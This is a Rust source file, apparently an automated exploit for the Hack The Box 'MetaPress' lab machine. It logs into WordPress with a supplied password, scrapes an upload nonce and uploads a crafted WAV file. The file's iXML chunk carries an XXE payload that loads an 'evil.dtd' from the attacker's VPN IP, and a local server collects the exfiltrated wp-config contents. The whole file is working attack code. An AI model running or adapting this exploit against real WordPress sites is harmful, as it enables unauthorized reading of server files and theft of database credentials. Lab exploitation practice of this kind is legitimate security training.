use socket2::{SockAddr, Domain, Type};
use std::io;
use std::io::Cursor;
use local_ip_address::{list_afinet_netifas, local_ip};
use log::info;
use regex::Regex;
use reqwest::Client;
use reqwest::multipart;
use warp::http::{HeaderMap, HeaderValue};
use warp::reply;
use crate::warpserver::Server;

pub struct Wave {
    pub client: Client,
    pub url: String,
    pub password: String,
}

impl Wave {
    pub fn new(client: Client, url: &str, password: String) -> Wave {
        Wave {
            client,
            url: url.to_string(),
            password
        }
    }

    pub async fn exploit(&self) -> String {
        let login_url = format!("http://{}/wp-login.php", &self.url);
        let body = format!("log=manager&\
        pwd={}&wp-submit=Log+In\
        &redirect_to=http%3A%2F%2Fmetapress.htb%2Fwp-admin%2F&testcookie=1", self.password.clone());
        //dbg!(body.clone());
        let mut headers = HeaderMap::new();
        headers.insert(
            "Cookie",
            HeaderValue::from_str("PHPSESSID=h3fcm4knbqf26fi5j027pr95n1; wordpress_test_cookie=WP%20Cookie%20check").expect("cookie set header error")
        );
        headers.insert(
            "Content-Type",
            HeaderValue::from_str("application/x-www-form-urlencoded").expect("Content-Type set error")
        );

        //to login and get the cookie to use for following requests
        let _res = self.client
            .post(login_url)
            .headers(headers)
            .body(body)
            .send()
            .await
            .unwrap();

        //dbg!(res.status());

        //the nonce needed to upload wave is different from the nonce needed to dump credentials. Need to rescrape nonce.
        let upload_url = format!("http://{}/wp-admin/upload.php", &self.url);
        let for_nonce = self.client
            .get(upload_url)
            .send()
            .await
            .expect("nonce re-get failed. Should not happen.");

        let mut new_nonce = for_nonce.text().await.unwrap();
        let re = Regex::new(r#"upload-attachment","_wpnonce":"(\S+?)""#).unwrap();
        if let Some(captures) = re.captures(&*new_nonce) {
            if let Some(newnonce) = captures.get(1) { // captures.get(1) refers to the first captured group
                new_nonce = newnonce.as_str().to_string();
            }
        }


        let upload_url = format!("http://{}/wp-admin/async-upload.php", &self.url);

        let local_ip = Wave::getIp().expect("Cannot find your VPN IP.\
                                                        Do me a favor, grab the \
                                                        wave.rs, and insert you ip\
                                                        into the getIp() function.\
                                                        You can do it! You are using\
                                                        Rust!");

        let evil_dtd_url = format!("http://{}:3123/evil.dtd", local_ip);
        info!("Your evil.dtd is located at {}", evil_dtd_url);

        //next step, set up warp for Server and serve dtd file.
        let evil_clone = evil_dtd_url.clone();
        let handle = tokio::spawn(async move {
            let server = Server::new(evil_clone);
            let wp_config = server.setup().await;
            wp_config
        });



        let mut payload:Vec<u8> = Vec::new();
        payload.extend(b"RIFF");
        payload.extend(&[0xb8, 0x00, 0x00, 0x00]);
        payload.extend(b"WAVEiXML");
        payload.extend(&[0x7b, 0x00, 0x00, 0x00]);
        payload.extend(b"<?xml version=\"1.0\"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM \"");
        payload.extend(evil_dtd_url.as_bytes());
        payload.extend(b"\">%remote;%init;%trick;]>\x00");

        //dbg!(payload);

        let part = multipart::Part::bytes(payload)
            .file_name("payload.wav")
            .mime_str("audio/vnd.wave")
            .expect("wave payload multipart wrong");

        let form = multipart::Form::new()
            .text("name", "payload.wav")
            .text("action", "upload-attachment")
            .text("_wpnonce", new_nonce)
            .part("async-upload", part);


        let _upload = self.client
            .post(upload_url)
            .multipart(form)
            .send()
            .await
            .unwrap();


        let returned = handle.await.unwrap();

        returned

    }

    fn getIp() -> Option<String> {
        let my_local_ip = list_afinet_netifas().expect("You sure you got Internet connection?");
        for (name, ip) in my_local_ip.iter() {
            if (name.contains("tun0")) {
                //todo: inject here like: return Some("10.0.2.3".to_string());
                return Some(ip.to_string());
            }
        }
        None
    }


}